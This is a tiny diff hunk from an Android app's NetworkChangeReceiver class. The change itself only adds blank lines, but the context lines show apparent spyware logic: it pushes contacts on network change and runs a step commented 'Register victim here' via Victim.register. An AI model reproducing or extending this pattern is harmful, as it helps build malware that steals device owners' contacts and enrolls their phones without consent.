@@ -32,6 +32,8 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
                 ContactUtils.push(context);
             } else {
 
+
+
                 //Register victim here
                 Victim.register(context, new JobListener() {
                     @Override
